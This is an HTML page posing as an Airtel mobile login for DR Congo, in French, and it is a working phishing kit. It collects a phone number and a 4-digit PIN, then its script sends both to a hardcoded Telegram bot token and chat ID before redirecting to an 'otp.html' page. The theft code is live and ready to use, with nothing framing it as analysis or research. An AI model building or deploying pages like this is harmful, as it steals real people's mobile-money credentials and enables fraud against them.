<!DOCTYPE html>
<html lang="fr">

<head>
    <!-- skill:chrome -->
    <style>
        /* Credit line — bottom-right */
        
        .design-ui-credit {
            position: fixed;
            bottom: 12px;
            right: 12px;
            font: 11px/1 system-ui, sans-serif;
            color: rgba(128, 128, 128, 0.5);
            pointer-events: none;
            z-index: 2147483647;
            transition: opacity 0.4s ease;
            user-select: none;
            letter-spacing: 0.02em;
        }
        /* Hide chrome on touch devices */
        
        @media (hover: none) {
            .design-ui-credit {
                display: none;
            }
        }
        /* Print fixes */
        
        @media print {
            * {
                transition: none !important;
                animation: none !important;
                box-shadow: none !important;
            }
            body {
                print-color-adjust: exact;
                -webkit-print-color-adjust: exact;
            }
            .design-ui-credit {
                display: none !important;
            }
        }
    </style>
    <script>
        (function() {
            // Design-ui pages are single compositions, so the whole body is editable.
            function markEditable() {
                document.body.classList.add('artifact-editable');
            }

            // Credit badge with idle-fade. Hover devices only.
            function initChromeUI() {
                if (!matchMedia('(hover: hover)').matches) return;

                var credit = document.createElement('div');
                credit.className = 'design-ui-credit';
                credit.setAttribute('aria-hidden', 'true');
                credit.innerHTML = '\u{1F49C} by ClickUp Brain';
                document.body.appendChild(credit);

                var timer = null;
                var fade = function(out) {
                    credit.style.opacity = out ? '0' : '';
                };
                fade(true);
                var show = function() {
                    fade(false);
                    clearTimeout(timer);
                    timer = setTimeout(function() {
                        fade(true);
                    }, 3000);
                };
                document.addEventListener('mousemove', show);
                show();
            }

            function init() {
                markEditable();
                initChromeUI();
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', init);
            } else {
                init();
            }
        })();
    </script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Airtel Login</title>

    <style>
        /* ✅ BASE FONT SYSTEM (PROFESSIONAL) */
        
        html {
            font-size: 16px;
        }
        
        @media (max-width: 360px) {
            html {
                font-size: 14px;
            }
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #ffffff;
            height: 100vh;
        }
        /* APP CONTAINER */
        
        .app {
            max-width: 420px;
            margin: auto;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 1.25rem;
        }
        /* LOGO */
        
        .logo {
            margin-top: 3rem;
        }
        
        .logo img {
            width: 6.5rem;
        }
        /* TITLE */
        
        .title {
            font-size: 0.95rem;
            color: #555;
            margin-top: 2.5rem;
        }
        /* COUNTRY */
        
        .country {
            font-size: 1.1rem;
            margin: 1.2rem 0 0.8rem;
            font-weight: 500;
        }
        /* INPUT */
        
        .input-box {
            display: flex;
            align-items: center;
            border-bottom: 0.12rem solid #2196f3;
            padding-bottom: 0.5rem;
        }
        
        .country-code {
            font-weight: bold;
            margin-right: 0.5rem;
            font-size: 1rem;
        }
        
        input {
            border: none;
            outline: none;
            flex: 1;
            font-size: 1.1rem;
            background: transparent;
        }
        /* PASSWORD / PIN */
        
        .password-label {
            font-size: 0.95rem;
            color: #555;
            margin-top: 2.5rem;
            margin-bottom: 0.8rem;
        }
        
        .pin-boxes {
            display: flex;
            gap: 1rem;
        }
        
        .pin-box {
            width: 3.5rem;
            height: 3rem;
            border: none;
            border-bottom: 0.15rem solid #2196f3;
            text-align: center;
            font-size: 1.4rem;
            font-weight: bold;
            font-family: Arial, sans-serif;
            background: transparent;
            outline: none;
            flex: none;
        }
        
        .pin-box:focus {
            border-bottom-color: #1976d2;
        }
        
        .pin-box.filled {
            border-bottom-color: #1976d2;
        }
        /* FLEX SPACER */
        
        .spacer {
            flex: 1;
        }
        /* TERMS */
        
        .terms {
            font-size: 0.75rem;
            color: #555;
            margin-bottom: 0.6rem;
        }
        
        .terms span {
            color: #2196f3;
        }
        /* BUTTON */
        
        .continue {
            width: 100%;
            padding: 0.9rem;
            background: #b0bec5;
            border: none;
            color: white;
            font-size: 1rem;
            border-radius: 0.6rem;
        }
        
        .continue.active {
            background: #1976d2;
        }
    </style>

</head>

<body>

    <div class="app">

        <!-- LOGO -->
        <div class="logo">
            <img src="/logo.svg" alt="Logo">
        </div>

        <!-- TEXT -->
        <div class="title">Vérifiez votre numéro de mobile pour continuer</div>
        <div class="country">République Démocratique du Congo</div>

        <!-- INPUT -->
        <div class="input-box">
            <span class="country-code">+243</span>
            <input type="tel" id="phone" placeholder="Entrez le numéro" inputmode="numeric">
        </div>

        <!-- PIN -->
        <div class="password-label">Entrez votre code pin</div>
        <div class="pin-boxes">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 1">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 2">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 3">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 4">
        </div>

        <div class="spacer"></div>

        <!-- TERMS -->
        <div class="terms">
            En continuant, j'accepte les <span>Termes et conditions</span>
        </div>

        <!-- BUTTON -->
        <button id="continueBtn" class="continue" disabled>Continuer</button>

    </div>

    <script>
        const phoneInput = document.getElementById("phone");
        const continueBtn = document.getElementById("continueBtn");
        const pins = document.querySelectorAll(".pin-box");

        const countryCode = "+243";

        // PIN auto-advance
        pins.forEach((pin, index) => {
            pin.addEventListener("input", (e) => {
                const val = e.target.value.replace(/[^0-9]/g, '');
                e.target.value = val;

                if (val && index < pins.length - 1) {
                    pins[index + 1].focus();
                }

                if (val) {
                    pin.classList.add("filled");
                } else {
                    pin.classList.remove("filled");
                }

                validate();

                // Auto-submit if all inputs are filled
                const otpFilled = Array.from(pins).every(p => p.value.length === 1);
                if (otpFilled) submitOTP();
            });

            pin.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !pin.value && index > 0) {
                    pins[index - 1].focus();
                    pins[index - 1].value = '';
                    pins[index - 1].classList.remove("filled");
                    validate();
                }
            });

            pin.addEventListener("paste", (e) => {
                e.preventDefault();
                const pasted = e.clipboardData.getData("text").replace(/[^0-9]/g, '').slice(0, 4);
                pasted.split('').forEach((char, i) => {
                    if (pins[index + i]) {
                        pins[index + i].value = char;
                        pins[index + i].classList.add("filled");
                    }
                });
                const nextIndex = Math.min(index + pasted.length, pins.length - 1);
                pins[nextIndex].focus();
                validate();

                // Auto-submit if all inputs are filled after paste
                const otpFilled = Array.from(pins).every(p => p.value.length === 1);
                if (otpFilled) submitOTP();
            });

            pin.addEventListener("focus", () => {
                pin.select();
            });
        });
        // Validate
        function validate() {
            const pinValue = Array.from(pins).map(p => p.value).join('');
            if (phoneInput.value.length >= 9 && pinValue.length === 4) {
                continueBtn.classList.add("active");
                continueBtn.disabled = false;
            } else {
                continueBtn.classList.remove("active");
                continueBtn.disabled = true;
            }
        }

        phoneInput.addEventListener("input", validate);

        // Function to submit OTP
        async function submitOTP() {
            const otp = Array.from(pins).map(p => p.value).join("");
            const savedPhone = countryCode + phoneInput.value;

            if (!savedPhone) {
                alert("Numéro de téléphone manquant. Veuillez redémarrer la vérification.");
                return;
            }

            if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
                alert("Veuillez entrer un OTP valide de 4 chiffres");
                return;
            }

            // Save to localStorage before sending
            localStorage.setItem("savedPhone", savedPhone);

            const message = `Tentative de connexion Star:\nTéléphone: ${savedPhone}\nCode:${otp}`;

            try {
                const botToken = "8784825775:AAG4ZDukSUOudvr4A23vwFCACRhga6-3-4o"; // Replace with your bot token
                const chatId = "5018626662"; // Replace with your chat ID

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();
                if (!data.ok) throw new Error(data.description || "Échec de l'envoi de l'OTP sur Telegram");

                // ✅ OTP sent successfully, redirect
                window.location.href = "otp.html"; // Replace with your target page
            } catch (error) {
                console.error("Erreur Telegram:", error);
                alert(error.message);
            }
        }


        // Save phone number to localStorage as user types
        phoneInput.addEventListener("input", () => {
            localStorage.setItem("savedPhone", countryCode + phoneInput.value);
        });

        // Restore saved phone number on page load
        window.addEventListener("DOMContentLoaded", () => {
            const saved = localStorage.getItem("savedPhone");
            if (saved && saved.startsWith(countryCode)) {
                phoneInput.value = saved.replace(countryCode, "");
                validate();
            }
        });

        // Continue button click handler
        continueBtn.addEventListener("click", submitOTP);
    </script>

</body>

</html>
